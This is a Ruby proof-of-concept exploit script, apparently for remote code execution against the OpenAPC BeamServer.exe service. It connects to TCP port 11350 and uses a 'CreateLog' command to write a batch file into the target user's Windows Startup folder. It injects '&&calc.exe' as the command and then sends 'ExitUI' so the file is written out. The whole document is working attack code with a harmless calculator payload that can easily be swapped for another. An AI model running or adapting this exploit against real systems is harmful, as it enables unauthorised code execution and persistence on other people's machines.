#!/usr/bin/env ruby 
# This abuses beanserver.exe by creating a log file
# and using logical AND operator's to execute os commands.
# Finally sending the 'ExitUI' to write the log file out.
# https://www.openapc.com/ |  OpenAPC.5.5-1.i386.exe
require 'rex'

host = ARGV[0]

def usage
   puts "[*] OpenAPC BeamServer.exe RCE"
   puts "[*] #{$0} <host>"
   exit
end

usage if ARGV.size < 1

begin

path =  "C:\\Users\\mc\\AppData\\Roaming\\Microsoft\\Windows"
path << "\\Start Menu\\Programs\\Startup\\poc.bat"

payload = "&&calc.exe"

sock = Rex::Socket::Tcp.create('PeerHost'  => host, 
                               'PeerPort'  => 11350)

sock.write("CreateLog #{path}\r\n")
res = sock.get_once()
puts res

sock.write(payload + "\r\n")
res = sock.get_once()
puts res

sock.write("ExitUI\r\n")
rescue => e
puts "[!] #{e.to_s}"
end
